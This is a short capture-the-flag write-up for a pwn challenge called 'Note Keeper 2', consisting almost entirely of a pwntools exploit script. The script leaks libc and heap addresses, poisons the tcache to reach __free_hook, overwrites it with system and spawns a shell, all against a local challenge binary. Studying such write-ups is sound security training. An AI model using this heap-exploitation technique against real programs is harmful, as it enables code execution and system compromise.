# Note Keeper 2

# Description
Category: PWN<br>
Solves: 0

# TL;DR

I didn't really participate in this CTF, I joined on the last hour<br>
The code wasn't provided, only the binary, libc, and ld. I solved it 2 days after the CTF ended,<br>
I'm too lazy to explain this one, I need some sleep

# Exploit

```python
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./new_chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def add(r, size, content):
    r.recvuntil(b'Enter an option:')
    r.sendline(b'1')
    r.recvuntil(b'Size: ')
    r.sendline(bytes(str(size), 'utf-8'))
    r.recvuntil(b'Note content: ')
    r.sendline(content)

def remove(r, index):
    r.recvuntil(b'Enter an option: ')
    r.sendline(b'2')
    r.recvuntil(b'Note index: ')
    r.sendline(bytes(str(index), 'utf-8'))

def view(r, index):
    r.recvuntil(b'Enter an option: ')
    r.sendline(b'4')
    r.recvuntil(b'Index: ')
    r.sendline(bytes(str(index), 'utf-8'))

def edit(r, index, content):
    r.recvuntil(b'Enter an option: ')
    r.sendline(b'3')
    r.recvuntil(b'Index: ')
    r.sendline(bytes(str(index), 'utf-8'))
    r.recvuntil(b'Content: ')
    r.sendline(content)

def conn():
    r = process([exe.path])
    return r


def main():
    r = conn()
 
    # Leaking libc address
 
    add(r, 1100, '')
    add(r, 16, '')
    remove(r, 0)
    add(r, 1100, 'a'*7)
    view(r, 1)
    r.recvuntil(b'a'*7 + b'\n')
    main_arena = int.from_bytes(r.recv(numb=6), "little")
    libc.address = main_arena - 0x1ecbe0 #offset
    log.info(f'Leaking libc address : {hex(libc.address)}')
    one_gadget = libc.address + 0xe3afe
    log.info(f'Calculating one_gadget address : {hex(one_gadget)}')
    remove(r, 1)
    remove(r, 0)

    # Leaking heap address

    add(r, 128, 'a'*15)
    view(r, 0)
    r.recvuntil(b'a'*15 + b'\n')
    heap = int.from_bytes(r.recv(numb=6), "little") + 32
    log.info(f'Leaking heap address : {hex(heap)}')
    tcache_key = heap - 672
    log.info(f'Calculating tcache-key address : {hex(tcache_key)}')

    # Leaking data segment address

    view(r, -11)
    data_addr = int.from_bytes(r.recv(numb=6), "little") + 88
    log.info(f'Leaking data address : {hex(data_addr)}')

    # Forging and freeing a fake chunk

    add(r, 16, '')
    remove(r, 1)

    fake_chunk = flat(p64(heap), p64(0x21))
    edit(r, 0, fake_chunk)
    offset = int((heap - data_addr - 16) / 8)
    remove(r, offset)

    # Poisoning the tcache-forward to point to __free_hook
    remove(r, 0)
    payload = flat(p64(0), p64(0x21), p64(libc.symbols['__free_hook']))
    add(r, 128, payload)
    add(r, 16, '/bin/bash\0')

    # Overwriting __free_hook pointer with system address

    add(r, 16, flat(p64(libc.symbols['system'])))

    # system('/bin/sh\0');
    log.info('Enjoy your $hell ;)')
    remove(r, 0)
    r.interactive()


if __name__ == "__main__":
    main()
```
# Flag

No flag this time xdd
